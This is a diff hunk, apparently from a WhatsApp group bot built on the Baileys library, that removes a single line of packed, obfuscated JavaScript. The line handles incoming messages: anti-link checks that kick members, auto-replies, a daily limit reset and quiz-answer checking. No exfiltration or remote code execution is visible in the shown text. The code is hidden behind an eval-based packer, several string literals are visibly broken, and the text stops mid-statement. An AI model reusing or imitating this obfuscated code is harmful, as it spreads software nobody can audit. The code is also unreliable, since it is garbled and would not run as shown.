@@ -1,1 +1,7790 @@
-eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('bm.on(\'U6\',1z.6h)1P(\'./U5\')1d{U4,z2,dl,bo,U3,Ap,p3,Ao,yF}=1P(\'@U2/U1\')1d fs=1P(\'fs\')1d os=1P(\'os\')1d 5C=1P(\'5C\')1d Bf=1P(\'Bf\')1d hx=1P(\'U0-7B\')1d 2D=1P(\'2D\')1d 5B=1P(\'5B\')1d 8D=1P(\'yt-7C\')1d qh=1P(\'TZ-7B\')1d 8C=1P(\'8C-it\')1d{6P,TY,TX}=1P("yo")1d 8i=1P(\'8i-AX\')1d{TW}=1P(\'TV\')1d 6V=1P(\'gK-8h\')1d{gK}=1P(\'TU\')1d{Bc}=1P(\'TT-Bd\')1d Bd=4v Bc()1d{TS,gJ,TR,TQ,TP,9f,7G,rt,a8,3H,3i,2I,5g,aH,8P,AY}=1P(\'./3k/TN\')1d qF=1P(\'TM-7B\')1d 1O=1P(\'TL\')1d{6s}=1P(\'./3k/6s\')1d 8B=1P(\'8B\')1d gk=1P("TK-7B")1d{hp}=1P("2C-7B")1d 2C=4v hp()1d{8Q}=1P(\'./3k/TJ\')1d{tu}=1P(\'./3k/TI\')1d{4N,TH}=1P(\'./3k/eG\')1d tr=1P(\'dr-Bb\')1d dr=1P(\'dr\')1d TG=1P(\'dr-Bb\')1d TF=1P(\'U-to-8R\')1d bS=1P(\'TE-bS\')1d{TD,TC,wD,TB,TA,tn}=1P(\'./3k/Tz\')1d oS=`0@s.2d.2q`1d 5j=dg+\'@s.2d.2q\'1d sM=8i.tz(\'dZ/dY\').5g(\'HH:mm:ss\')1d sL=8i.tz(\'dZ/dY\').5g(\'DD/MM/yW\')1d aK=8i().tz(\'dZ/dY\').5g(\'HH:mm:ss\')if(aK<"23:59:6O"){1m a9=\'ap Ty 🔖\'}if(aK<"19:6O:6O"){1m a9=\'ap rO 🔖\'}if(aK<"18:6O:6O"){1m a9=\'ap rO 🔖…\'}if(aK<"15:6O:6O"){1m a9=\'ap rO 🔖\'}if(aK<"11:6O:6O"){1m a9=\'ap Ba 🔖„\'}if(aK<"Tx:6O:6O"){1m a9=\'ap Ba 🔖‰\'}B 7l=db.M.2g.7l=[]B aF=db.M.2g.7M=[]B 7I=db.M.2g.9N=[]B 7k=db.M.2g.7k=[]B 7L=db.M.2g.7L=[]B 7J=db.M.2g.Tw=[]B cd=db.M.2g.Tv=[]B 8t=db.M.2g.Tu=[]B 7K=db.M.2g.Tt=[]B ho=db.M.2g.Ts=[]B 2E=db.M.5A.2E=[]B bD=db.M.5A.Tr=[]B 2T=db.M.5A.2T=[]B e1=db.M.5A.6a=[]B bF=db.M.5A.bF=[]B bC=db.M.5A.bC=[]B bB=db.M.5A.bB=[]B 8S=db.M.5A.8S=[]B bz=db.M.5A.bz=[]B bw=db.M.5A.bw=[]B fF=db.M.5A.fF=[]B bv=db.M.5A.bv=[]B bt=db.M.5A.bt=[]B rJ=db.M.5A.rJ=[]B bs=db.M.5A.bs=[]B AD=4L.ay(fs.3E(\'./5i/8L/7g-hD-hC-Ke-hB/2R.4j\'))B AC=4L.ay(fs.3E(\'./5i/8L/7g-hD-hC-Ke-hB/2H.4j\'))B AB=4L.ay(fs.3E(\'./5i/8L/7g-hD-hC-Ke-hB/U.4j\'))B AA=4L.ay(fs.3E(\'./5i/8L/7g-hD-hC-Ke-hB/2V.4j\'))B 8f=4L.ay(fs.3E(\'./yJ/6u/8f.4j\'))1d p9=4L.ay(fs.3E(\'./4p/p8.4j\'))hq=fs.3E(\'./7Z/p1.fD\')1d{dj}=1P(\'./7Z/dj\')1d{B9}=1P(\'./7Z/B9\')1d{B8}=1P(\'./7Z/B8\')1d{ry}=1P(\'./7Z/ry\')Tq.Tp=C=4A(C,m,An,c9)=>{6p{1m 6b=(m.8x===\'ed\')?m.1W.ed:(m.8x==\'6Y\')?m.1W.6Y.Y:(m.8x==\'9K\')?m.1W.9K.Y:(m.8x==\'4W\')?m.1W.4W.D:(m.8x==\'cj\')?m.1W.cj.hA:(m.8x==\'ci\')?m.1W.ci.hz.hy:(m.8x==\'ec\')?m.1W.ec.rN:(m.8x===\'Tn\')?(m.1W.cj?.hA||m.1W.ci?.hz.hy||m.D):\'\'1m 2S=(aN m.D==\'rT\'?m.D:\'\')1m j=B7?/^[🔖°🔖€¢Ï€Ã·Ã—🔖¶🔖ˆ†🔖£🔖¢🔖‚¬🔖¥🔖®🔖„¢+🔖œ“4f=|~!?@#$%^&.🔖©^]/gi.1t(6b) ? 6b.gm(/^[🔖°🔖€¢Ï€Ã·Ã—🔖¶🔖ˆ†🔖£🔖¢🔖‚¬🔖¥🔖®🔖„¢+🔖œ“4f=|~!?@#$%^&.🔖©^]/gi)[0]:"":B7??W.j 1d 5W=6b.6o(j)1d K=6b.3m(j,\'\').5p().1h(/ +/).rM().3c()1d 1s=6b.5p().1h(/ +/).6n(1)1d 7W=m.e0||"No bV"1d 6K=F C.Tm(C.2f.id)1d 2b=[6K,...W.2j].2L(v=>v.3m(/[^0-9]/g,\'\')+\'@s.2d.2q\').2i(m.1l)1d Tl=m.1l==6K?2l:1Z 1d D=q=1s.2t(" ")1d H=m.H?m.H:m 1d 2Y=(H.2K||H).3C||\'\'1d pe=/U|2V|2R|2H/.1t(2Y)1d 1l=m.1N?(aJ.2n.4K?aJ.2n.4K:aJ.4K):aJ.2n.5d 1d 1k=aJ.2n.5d 1d V=3R.7X(aJ.1W)[0]1d bU=4L.6Q(aJ.1W)1d rE=6b.6n(0).5p().1h(/ +/).rM().3c()1d dp=V===\'4W\'&&bU.2i(\'6Y\')1d wi=V===\'4W\'&&bU.2i(\'9K\')1d wj=V===\'4W\'&&bU.2i(\'B4\')1d tq=V===\'4W\'&&bU.2i(\'tp\')1d B6=(m.2K.aI===\'ed\'&&m.2K.1W.ed)?m.2K.1W.ed:(m.2K.aI==\'6Y\')&&m.2K.1W.6Y.Y?m.2K.1W.6Y.Y:(m.2K.aI==\'9K\')&&m.2K.1W.9K.Y?m.2K.1W.9K.Y:(m.2K.aI==\'4W\')&&m.2K.1W.4W.D.6o(j)?m.2K.1W.4W.D:(m.2K.aI==\'cj\')&&m.2K.1W.cj.hA.6o(j)?m.2K.1W.cj.hA:(m.2K.aI==\'ci\')&&m.2K.1W.ci.hz.hy.6o(j)?m.2K.1W.ci.hz.hy:(m.2K.aI==\'ec\')&&m.2K.1W.ec.rN.6o(j)?m.2K.1W.ec.rN:\'\'1d 8O=B6.6n(0).5p().1h(/ +/).rM().3c()1d Tk={2n:{3B:1Z,"4K":"0@s.2d.2q","5d":"3t@5V"},"1W":{Tj:{Ti:rx,3t:B5,6T:5t,Th:B5,1W:1b,Tg:6d,Tf:\'0@s.2d.2q\'}},2Q:{"rR":wM,"rQ":2l},B0:2l}1d qf={2n:{4K:\'0@s.2d.2q\',...(m.E?{5d:`3t@5V`}:{})},1W:{oX:{2e:1b,6l:5t}}}1d yd={2n:{4K:`0@s.2d.2q`,...(m.E?{5d:"3t@5V"}:{})},1W:{"B4":{"3C":"2H/Te; Td=Tc","7f":rL,"cl":"2l"}}}1d Tb={2n:{4K:`0@s.2d.2q`,...(m.E?{5d:"3t@5V"}:{})},1W:{"9K":{"2e":1b,"h":wm,\'7f\':\'rL\',\'y8\':\'2l\',\'Y\':6d,\'6l\':5t}}}1d xL={2n:{4K:"0@s.2d.2q","5d":"0@s.2d.2q"},"1W":{"Ta":{"T9":"T8-T7@g.us","T6":"m","AZ":wm,"Y":`${7W}`,\'6l\':5t}}}1d T5={2n:{3B:1Z,4K:`0@s.2d.2q`,...(m.E?{5d:"3t@5V"}:{})},1W:{"9K":{"2e":1b,"h":wm,\'7f\':\'rL\',\'Y\':`${7W}`,\'6l\':5t}}}1d T4={2n:{4K:\'0@s.2d.2q\',...(m.E?{5d:`3t@5V`}:{})},1W:{y7:{2m:wm,6l:5t}}}1d fx={2n:{4K:`0@s.2d.2q`,...(m.E?{5d:`3t@5V`}:{})},1W:{\'T3\':{\'T2\':6d,\'T1\':`T0:B1\\SZ:3.0\\nN:SY;${6d},;\\SX:${6d}\\B2.SW;SV=B3:B3\\B2.X-SU:ST\\SS:B1`,\'6l\':5t,6T:5t,B0:2l}}}1d SR={2n:{3B:1Z,4K:`0@s.2d.2q`,...(m.E?{5d:"3t@5V"}:{})},1W:{"6Y":{"R":"S://oW.2d.2q/d/f/SQ-SP.di","3C":"U/fD","Y":wm,"6W":"+Ia+SN=","oQ":"SM","SL":SK,"yR":SJ,"oV":"SI=","oU":"SH/SG=","sZ":"/v/sY.SF-24/SE.di?oh=SD&oe=SC","sX":"SB","6l":fs.3E(\'./5i/8L/pj.6Z\'),"SA":"Sz/Sy+Sx=="}}}1d 4M=m.1N?F C.4M(m.E).1j(e=>{}):\'\'1d AZ=m.1N?4M.oR:\'\'1d 3V=m.1N?F 4M.3V:\'\'1d rK=m.1N?F AY(3V):\'\'1d 2M=m.1N?rK.2i(6K):1Z 1d 2G=m.1N?rK.2i(m.1l):1Z 1d a7=2b||W.rG.2L(v=>v.3m(/[^0-9]/g,\'\')+\'@s.2d.2q\').2i(m.1l)||1Z 1d 8k=m.1N?e1.2i(1k):1Z 1d fL=bD.2i(1k)1d fN=m.1N?2T.2i(1k):1Z 1d fO=m.1N?bF.2i(1k):1Z 1d fJ=m.1N?bC.2i(1k):1Z 1d fI=m.1N?bB.2i(1k):1Z 1d fH=m.1N?8S.2i(1k):1Z 1d fG=m.1N?bz.2i(1k):1Z 1d fE=m.1N?bw.2i(1k):1Z 1d dw=m.1N?fF.2i(1k):1Z 1d du=m.1N?bv.2i(1k):1Z 1d pl=m.1N?bt.2i(1k):1Z 1d rF=m.1N?rJ.2i(1k):1Z 1d ds=m.1N?bs.2i(1k):1Z 1d rl=[\'🔖Š : 🔖’ : 🔖\',\'🔖’ : 🔖”” : 🔖Š\',\'🔖‡ : 🔖‡ : 🔖‡\',\'🔖Š : 🔖‹ : 🔖””\',\'🔖”” : 🔖’ : 🔖\',\'🔖”” : 🔖’ : 🔖Š\',\'🔖Š : 🔖‹ : 🔖””\',\'🔖 : 🔖’ : 🔖‹\',\'🔖 : 🔖 : 🔖\',\'🔖Š : 🔖’ : 🔖’\',\'🔖”” : 🔖”” : 🔖‡\',\'🔖Œ : 🔖’ : 🔖””\',\'🔖 : 🔖”” : 🔖””\',\'🔖Š : 🔖‹ : 🔖’\',\'🔖‹ : 🔖‹ : 🔖Œ\',\'🔖”” : 🔖”” : 🔖‡\',\'🔖”” : 🔖 : 🔖‡\',\'🔖”” : 🔖”” : 🔖””  e6\',\'🔖’ : 🔖’ : 🔖’ e6\',\'🔖Œ : 🔖Œ : 🔖Œ Sw\']6p{B hw=x=>aN x===\'8J\'&&!Sv(x)B e9=a7?W.hu.rG:W.hu.2Z B 2f=W.db.M.3M[m.1l]if(aN 2f!==\'rI\')W.db.M.3M[m.1l]={}if(2f){if(!hw(2f.6N))2f.6N=-1 if(!(\'9B\'in 2f))2f.9B=\'\'if(!hw(2f.a6))2f.a6=e9}1y W.db.M.3M[m.1l]={6N:-1,9B:\'\',a6:e9,}B 4g=W.db.M.4g[m.E]if(aN 4g!==\'rI\')W.db.M.4g[m.E]={}if(4g){if(!(\'5z\'in 4g))4g.5z=1Z if(!(\'3s\'in 4g))4g.3s=1Z}1y W.db.M.4g[m.E]={5z:1Z,3s:1Z,}B 4T=W.db.M.c1[6K]if(aN 4T!==\'rI\')W.db.M.c1[6K]={}if(4T){if(!hw(4T.3t))4T.3t=0 if(!(\'ht\'in 4T))4T.ht=1Z if(!(\'8r\'in 4T))4T.8r=2l if(!(\'8q\'in 4T))4T.8q=1Z if(!(\'8p\'in 4T))4T.8p=1Z if(!(\'aw\'in 4T))4T.aw=1Z}1y W.db.M.c1[6K]={3t:0,ht:1Z,8r:2l,8q:1Z,8p:1Z,aw:1Z,}}1j(P){1z.6h(P)}if(!C.a5){if(!m.2n.3B)L}8A ar(6c){L 6c[1C.2v(6c.1F*1C.1V())]}C.N(m.E,{8I:{D:`${ar([\'🎠\'])}`,2n:m.2n,}})if(m.1W){C.Su([m.2n])1z.1B(5B.bX(5B.St(\'[ y6 ]\')),5B.bX(5B.Ss(4v 7j)),5B.bX(5B.Sr(2S||m.8x))+\'\\n\'+5B.Sq(\'=> 9e\'),5B.gB(7W),5B.Sp(m.1l)+\'\\n\'+5B.So(\'=> In\'),5B.gB(m.1N?7W:\'Sn 8K\',m.E))}B rH=1P(\'Sm-rH\')rH.Sl(\'6O 12 * * *\',()=>{B 2f=3R.7X(W.db.M.3M)B e9=a7?W.hu.rG:W.hu.2Z 1U(B hj of 2f)W.db.M.3M[hj].a6=e9 1z.1B(\'Sk gq\')},{Sj:2l,AX:"dZ/dY"})W.AW={}if(5W){M=F 3H(\'S://7B.Si.Sh/AW/C-md/Sg\')sP=`${M.8c}`AV=F 3H(`S:sO=`${AV.8c}`}if(db.M.c1[6K].ht){B 4T=W.db.M.c1[6K]if(4v 7j()*1-4T.3t>cb){B bl=F a8(bm.bl())F C.xE(`${C.2f.2m}|Sf:${a8(bl)}`)4T.3t=4v 7j()*1}}if(W.Se){if(m.E){C.AU(\'Sd\',m.E)}}if(W.Sc){if(m.E){C.AU(\'Sb\',m.E)}}if(fN){if(/U/.1t(2Y)&&!/8m/.1t(2Y)){B 9J=F H.7h()F C.5J(1k,9J,m,{2N:W.2N,2u:W.2u})1z.1B(`AT 2R AS`)}1y if(/2V/.1t(2Y)){if((H.2K||H).7f>11)L B 9J=F H.7h()F C.gg(1k,9J,m,{2N:W.2N,2u:W.2u})}}if(fL){if(/U/.1t(2Y)&&!/8m/.1t(2Y)){B 9J=F H.7h()F C.5J(1k,9J,m,{2N:W.2N,2u:W.2u})1z.1B(`AT 2R AS`)}1y if(/2V/.1t(2Y)){if((H.2K||H).7f>11)L B 9J=F H.7h()F C.gg(1k,9J,m,{2N:W.2N,2u:W.2u})}}if(ds)if(8f.2i(rE)){ch=[\'AP, AO 2h AN\',\'AL 4x AK 9P to AJ?\',\'8y pQ 6u my bH🔖¤¢\',\'rh be 6u🔖¦„\']dX=ch[1C.2v(1C.1V()*(ch.1F))]m.z(dX)if(m.D){2x=`\\`\\`\\`hr aE 3p\\`\\`\\`\\n\\rD 4y dH 8f aj bO 1a 4y an 2r 5o\'s dA i rC\'t bh 1a🔖˜‡`if(2G)L z(2x)if(m.2n.3B)L z(2x)if(2b)L z(2x)2s=m.1l F C.4S(m.E,[2s],\'4N\')C.N(1k,{D:`\\`\\`\\`hr aE 3p\\`\\`\\`\\n\\n@${2s.1h("@")[0]}7c 3O 5T of dH 8f dt in 1o 1v`,2Q:{2B:[2s]}},{H:m})}}if(db.M.4g[m.E].3s){if(2S.gm(`E.2d.3z`)){2s=m.1l m.z(`\\`\\`\\`5H 3v 3p\\`\\`\\`\\n\\n@${2s.1h("@")[0]}5R 4x 3O 5T of 7m 1q in 1o 1v`)if(!2M)L m.z(`${J.3h},to bh 1n 4Z 3g 2F 1q`)B r4=(`S:B AR=4v Sa(r4,\'i\')B AQ=AR.1t(m.D)if(AQ)L m.z(`\\`\\`\\`5H 3v 3p\\`\\`\\`\\n\\rD rC\'t be 3O by a 6X 5T 5E 1a 2F is a 1q to 1o 1v`)if(2G)L m.z(`\\`\\`\\`5H 3v 3p\\`\\`\\`\\n\\7n 3G 5q a 1q,2r is 2Z to pO 4l 1q`)if(2b)L m.z(`\\`\\`\\`5H 3v 3p\\`\\`\\`\\n\\S9 3G 5q a 1q,2j is 2Z to pO 4l 1q`)C.4S(m.E,[m.1l],\'4N\')}}if(rF)if(2S.2i(`wa.me`)){if(!2M)L 2x=`\\`\\`\\`hs.me 3v 3p\\`\\`\\`\\n\\7n 3G 5q a wa.me 1q,2r is 2Z to 2F 4l 1q`if(2G)L m.z(2x)if(m.2n.3B)L m.z(2x)if(2b)L m.z(2x)2s=m.1l F C.4S(m.E,[2s],\'4N\')C.N(1k,{D:`\\`\\`\\`hs.me 3v 3p\\`\\`\\`\\n\\n@${2s.1h("@")[0]}5R 4x 3O 5T of 7m 6j 2V 1q in 1o 1v`,2Q:{2B:[2s]}},{H:m})}1y{}if(rF)if(2S.2i(`S8:if(!2M)L 2x=`\\`\\`\\`hs.me 3v 3p\\`\\`\\`\\n\\7n 3G 5q a wa.me 1q,2r is 2Z to 2F 4l 1q`if(2G)L m.z(2x)if(m.2n.3B)L m.z(2x)if(2b)L m.z(2x)2s=m.1l F C.4S(m.E,[2s],\'4N\')C.N(1k,{D:`\\`\\`\\`hs.me 3v 3p\\`\\`\\`\\n\\n@${2s.1h("@")[0]}5R 4x 3O 5T of 7m 6j 2V 1q in 1o 1v`,2Q:{2B:[2s]}},{H:m})}1y{}if(fO){if(2S.1F>S7){m.z(`S6 S5 tI!!S4 as 7u\\n`.cm(S3))m.z(`\\`\\`\\`ã€ŒS2 3pã€\\`\\`\\`\\n\\S1 4e S0 Be RZ!`)if(!2M)L m.z(J.3h)C.4S(m.E,[m.1l],\'4N\')}}if(ds)if(8f.2i(rE)){ch=[\'AP, AO 2h AN\',\'AL 4x AK 9P to AJ?\',\'8y pQ 6u my bH🔖¤¢\',\'rh be 6u🔖¦„\']dX=ch[1C.2v(1C.1V()*(ch.1F))]m.z(dX)if(m.D){2x=`\\`\\`\\`ã€Œhr aE 3pã€\\`\\`\\`\\n\\rD 4y dH 8f aj bO 1a 4y an 2r 5o\'s dA i rC\'t bh 1a🔖˜‡`if(2G)L m.z(2x)if(m.2n.3B)L m.z(2x)if(2b)L m.z(2x)2s=m.1l F C.4S(m.E,[2s],\'4N\')C.N(1k,{D:`\\`\\`\\`ã€Œhr aE 3pã€\\`\\`\\`\\n\\n@${2s.1h("@")[0]}7c 3O 5T of dH 8f dt in 1o 1v`,2Q:{2B:[2s]}},{H:m})}}if(fJ)if(2S.2i("S://RY.be/")){if(!2M)L 2x=`\\`\\`\\`AI 4E 3v 3p\\`\\`\\`\\n\\7n 3G 5q a 6j 2V 1q,2r is 2Z to 2F 4l 1q🔖˜‡`if(2G)L m.z(2x)if(m.2n.3B)L m.z(2x)if(2b)L m.z(2x)2s=m.1l F C.4S(m.E,[2s],\'4N\')C.N(1k,{D:`\\`\\`\\`ã€Œdd 4E 3v 3pã€\\`\\`\\`\\n\\n@${2s.1h("@")[0]}5R 4x 3O 5T of 7m 6j 2V 1q in 1o 1v`,2Q:{2B:[2s]}},{H:m})}1y{}if(fI)if(2S.2i("S://6j.3z/")){if(!2M)L 2x=`\\`\\`\\`ã€ŒAI qK 3v 3pã€\\`\\`\\`\\n\\7n 3G 5q a 6j dx 1q,2r is 2Z to 2F 4l 1q🔖˜‡`if(2G)L m.z(2x)if(m.2n.3B)L m.z(2x)if(2b)L m.z(2x)2s=m.1l F C.4S(m.E,[2s],\'4N\')C.N(1k,{D:`\\`\\`\\`ã€Œdd qK 3v 3pã€\\`\\`\\`\\n\\n@${2s.1h("@")[0]}5R 4x 3O 5T of 7m 6j dx 1q in 1o 1v`,2Q:{2B:[2s]}},{H:m})}1y{}if(fH)if(2S.2i("S://AE.bA.3z/")){if(!2M)L 2x=`\\`\\`\\`ã€ŒAH 3v 3pã€\\`\\`\\`\\n\\7n 3G 5q a bA 1q,2r is 2Z to 2F 4l 1q🔖˜‡`if(2G)L m.z(2x)if(m.2n.3B)L m.z(2x)if(2b)L m.z(2x)2s=m.1l F C.4S(m.E,[2s],\'4N\')C.N(1k,{D:`\\`\\`\\`ã€ŒAH 3v 3pã€\\`\\`\\`\\n\\n@${2s.1h("@")[0]}5R 4x 3O 5T of 7m bA 1q in 1o 1v`,2Q:{2B:[2s]}},{H:m})}1y{}if(fG)if(2S.2i("S://bx.3z/")){if(!2M)L 2x=`\\`\\`\\`ã€ŒAG 3v 3pã€\\`\\`\\`\\n\\7n 3G 5q a bx 1q,2r is 2Z to 2F 4l 1q🔖˜‡`if(2G)L m.z(2x)if(m.2n.3B)L m.z(2x)if(2b)L m.z(2x)2s=m.1l F C.4S(m.E,[2s],\'4N\')C.N(1k,{D:`\\`\\`\\`ã€ŒAG 3v 3pã€\\`\\`\\`\\n\\n@${2s.1h("@")[0]}5R 4x 3O 5T of 7m bx 1q in 1o 1v`,2Q:{2B:[2s]}},{H:m})}1y{}if(dw)if(2S.2i("S://t.me/")){if(dw)if(!2M)L 2x=`\\`\\`\\`ã€ŒAF 3v 3pã€\\`\\`\\`\\n\\7n 3G 5q a dv 1q,2r is 2Z to 2F 4l 1q🔖˜‡`if(2G)L m.z(2x)if(m.2n.3B)L m.z(2x)if(2b)L m.z(2x)2s=m.1l F C.4S(m.E,[2s],\'4N\')C.N(1k,{D:`\\`\\`\\`ã€ŒAF 3v 3pã€\\`\\`\\`\\n\\n@${2s.1h("@")[0]}5R 4x 3O 5T of 7m dv 1q in 1o 1v`,2Q:{2B:[2s]}},{H:m})}1y{}if(fE)if(2S.2i("S://AE.6t.3z/")){if(!2M)L 2x=`\\`\\`\\`ã€ŒrB 3v 3pã€\\`\\`\\`\\n\\7n 3G 5q a 6t 1q,2r is 2Z to 2F 4l 1q🔖˜‡`if(2G)L m.z(2x)if(m.2n.3B)L m.z(2x)if(2b)L m.z(2x)2s=m.1l F C.4S(m.E,[2s],\'4N\')C.N(1k,{D:`\\`\\`\\`ã€ŒrB 3v 3pã€\\`\\`\\`\\n\\n@${2s.1h("@")[0]}5R 4x 3O 5T of 7m 6t 1q in 1o 1v`,2Q:{2B:[2s]}},{H:m})}1y{}if(du)if(2S.2i("S://bu.3z/")){if(!2M)L 2x=`\\`\\`\\`ã€ŒRX 3v 3pã€\\`\\`\\`\\n\\7n 3G 5q a bu 1q,2r is 2Z to 2F 4l 1q🔖˜‡`if(2G)L m.z(2x)if(m.2n.3B)L m.z(2x)if(2b)L m.z(2x)2s=m.1l F C.4S(m.E,[2s],\'4N\')C.N(1k,{D:`\\`\\`\\`ã€ŒrB 3v 3pã€\\`\\`\\`\\n\\n@${2s.1h("@")[0]}5R 4x 3O 5T of 7m bu 1q in 1o 1v`,2Q:{2B:[2s]}},{H:m})}1y{}if(pl)if(2S.2i("S://")){if(!2M)L 2x=`\\`\\`\\`ã€Œ3v 3pã€\\`\\`\\`\\n\\7n 3G 5q a 1q,2r is 2Z to 2F 4l 1q🔖˜‡`if(2G)L m.z(2x)if(m.2n.3B)L m.z(2x)if(2b)L m.z(2x)2s=m.1l F C.4S(m.E,[2s],\'4N\')C.N(1k,{D:`\\`\\`\\`ã€Œ3v 3pã€\\`\\`\\`\\n\\n@${2s.1h("@")[0]}5R 4x 3O 5T of 7m 1q in 1o 1v`,2Q:{2B:[2s]}},{H:m})}1y{}1U(B rA of AD){if(2S===rA){1E=fs.3E(`./5i/2R/${rA}.8m`)C.N(m.E,{2R:1E},{H:m})}}1U(B rz of AC){if(2S===rz){1E=fs.3E(`./5i/2H/${rz}.9c`)C.N(m.E,{2H:1E,3C:\'2H/6q\',cl:2l},{H:m})}}1U(B cg of AB){if(2S===cg){1E=fs.3E(`./5i/U/${cg}.6Z`)C.N(m.E,{U:1E},{H:m})}}1U(B cg of AA){if(2S===cg){1E=fs.3E(`./5i/2V/${cg}.6q`)C.N(m.E,{2V:1E},{H:m})}}1d tj=(1Y)=>{C.dh(m.E,{8a:{4B:{4W:{D:1Y,oZ:\'oY\',RW:\'0@s.2d.2q\',RV:RU,p4:1,RT:5t}}}},{})}1d ab={2n:{3B:1Z,4K:`0@s.2d.2q`,...(1k?{5d:""}:{})},"1W":{"oX":{"R":"S://oW.2d.2q/d/f/RS.di","3C":"fB/t3-t2","6W":"RR/RQ=","oQ":"RP","oP":1,"oV":"RO/RN=","5I":`${6d}🔖˜£ï¸${ry(j)}`,"oU":"RM+RL="}}}1d As={2n:{3B:1Z,4K:`0@s.2d.2q`,...(1k?{5d:"RK-RJ@g.us"}:{})},"2Q":{"RI":"RH","fz":{"Az":"Ay","oO":2l,"fy":bj,"Ax":\'S://i.hc.co/Aw/Av-rx-gw-Au.6Z\',"6T":hq,}}}1d RG=(1Y)=>{C.N(m.E,{U:hq,Y:wm,2Q:{"fz":{"2e":1b,"6b":6d,Az:"Ay",oO:2l,fy:bj,Ax:\'S://i.hc.co/Aw/Av-rx-gw-Au.6Z\',6T:hq,}}},{H:As})}1d 5P=(gC,Ar)=>{6p{1d{hp}=1P("2C-7B");1d 2C=4v hp();2C.2k(gC).1u(2C=>{1d 1c=[{1g:"y",1e:{1f:gC},V:1}]1d 1R={U:{R:2C.dJ[Ar].R},Y:"1I 1a go! 🏃🏻‍♂️",RF:`${1b}`,1c:1c,1G:4}C.N(1k,1R,{H:m})})}1j(e){m.z("RE 6h, uO Aq RD 2C\\RC : RB Aq 1 2C")}}if(db.M.4g[m.E].5z&&!2G&&!2b){L}if(pe&&m.2K.6W&&(m.2K.6W.dW(\'8R\')in W.db.M.2R)){B 5y=W.db.M.2R[m.2K.6W.dW(\'8R\')]B{D,2B}=5y B 6G=F Ap(m.E,{D:D,3y:2B},{bn:C.2f.id,H:m.H&&m.H.yK})6G.2n.3B=Ao(m.1l,C.2f.id)6G.2n.id=m.2n.id 6G.e0=m.e0 if(m.1N)6G.4K=m.1l B 2K={...An,6G:[bo.RA.dk(6G)],V:\'Rz\'}C.ev.Ry(\'6G.Rx\',2K)}if((\'7M\'+m.E in aF)&&5W){8w=2l B 1x=aF[\'7M\'+m.E]B 1Y=2S.3c().3m(/[^\\w\\s\\-]+/,\'\')B cf=/^((me)?hf up|Aj?Ai)$/i.1t(m.D)if(!cf){B 7F=1x.2P.Rw(v=>v.3c().3m(/[^\\w\\s\\-]+/,\'\')===1Y)if(1x.9A[7F])L!0 1x.9A[7F]=m.1l}B 9E=1x.9A.1F===1x.9A.5O(v=>v).1F B Y=`4z 1n e4 rn:\\n${1x.aD}\\n\\n\\zF is ${1x.2P.1F}4z ${1x.2P.4U(v=>v.2i(\' \'))?`(zE zD 3P zC)`:\'\'}${9E?`bi Rv Ru`:cf?\'Rt up!\':\'\'}${zz.1k(1x.2P,(2P,7F)=>{L cf||1x.9A[7F]?`(${7F+1})${2P}${1x.9A[7F]?\'@\'+1x.9A[7F].1h(\'@\')[0]:\'\'}`.5p():1Z}).5O(v=>v).2t(\'\\n\')}${cf?\'\':`Rs Rr`}`.5p()C.3A(m.E,Y,m,{2Q:{2B:aH(Y)}}).1u(Rq=>{L aF[\'7M\'+m.E].zB=Rp}).1j(4f=>4f)if(9E||cf)2y aF[\'7M\'+m.E]}if(7l.4o(m.1l.1h(\'@\')[0])&&5W){8w=2l 2P=7l[m.1l.1h(\'@\')[0]]if(2S.3c()==2P){F C.2a(m.E,[{1g:\'4V 5F\',1e:{1f:\'4H 1X Ro\'},V:1}],`🔖Ž®4H 1X Rn🔖Ž®\\n\\9I 4z🔖Ž‰\\n\\5S To 8v 9H?9q 1X 7s 8M`,C.2f.2m,m)2y 7l[m.1l.1h(\'@\')[0]]}1y m.z(\'*9G 6M!*\')}if(7I.4o(m.1l.1h(\'@\')[0])&&5W){8w=2l 2P=7I[m.1l.1h(\'@\')[0]]if(2S.3c()==2P){F m.z(`🔖Ž®1C Rm🔖Ž®\\n\\9I 4z🔖Ž‰\\n\\5S To 8v 9H?3U ${j}9N kP`)2y 7I[m.1l.1h(\'@\')[0]]}1y m.z(\'*9G 6M!*\')}if(7k.4o(m.1l.1h(\'@\')[0])&&5W){8w=2l 2P=7k[m.1l.1h(\'@\')[0]]if(2S.3c()==2P){F C.2a(m.E,[{1g:\'4V 7a\',1e:{1f:\'4H 1X Am\'},V:1}],`🔖Ž®4H 1X Am🔖Ž®\\n\\9I 4z🔖Ž‰\\n\\5S To 8v 9H?9q 1X 7s 8M`,C.2f.2m,m)2y 7k[m.1l.1h(\'@\')[0]]}1y m.z(\'*9G 6M!*\')}if(7L.4o(m.1l.1h(\'@\')[0])&&5W){8w=2l 2P=7L[m.1l.1h(\'@\')[0]]if(2S.3c()==2P){F C.2a(m.E,[{1g:\'4V aj\',1e:{1f:\'4H 1X aE\'},V:1}],`🔖Ž®4H 1X aE🔖Ž®\\n\\9I 4z🔖Ž‰\\n\\5S To 8v 9H?9q 1X 7s 8M`,C.2f.2m,m)2y 7L[m.1l.1h(\'@\')[0]]}1y m.z(\'*9G 6M!*\')}if(7J.4o(m.1l.1h(\'@\')[0])&&5W){8w=2l 2P=7J[m.1l.1h(\'@\')[0]]h6=cd[m.1l.1h(\'@\')[0]]if(2S.3c()==2P){F C.2a(m.E,[{1g:\'4V Rl\',1e:{1f:\'4H 1X Al\'},V:1}],`🔖Ž®4H 1X Al🔖Ž®\\n\\9I 4z🔖Ž‰\\n*${h6}*\\n\\5S To 8v 9H?9q 1X 7s 8M`,C.2f.2m,m)2y 7J[m.1l.1h(\'@\')[0]]2y cd[m.1l.1h(\'@\')[0]]}1y m.z(\'*9G 6M!*\')}if(8t.4o(m.1l.1h(\'@\')[0])&&5W){8w=2l 2P=8t[m.1l.1h(\'@\')[0]]if(2S.3c()==2P){F C.2a(m.E,[{1g:\'4V ha\',1e:{1f:\'4H 1X rp\'},V:1}],`🔖Ž®4H 1X rp🔖Ž®\\n\\9I 4z🔖Ž‰\\n\\5S To 8v 9H?9q 1X 7s 8M`,C.2f.2m,m)2y 8t[m.1l.1h(\'@\')[0]]}1y m.z(\'*9G 6M!*\')}if(7K.4o(m.1l.1h(\'@\')[0])&&5W){8w=2l 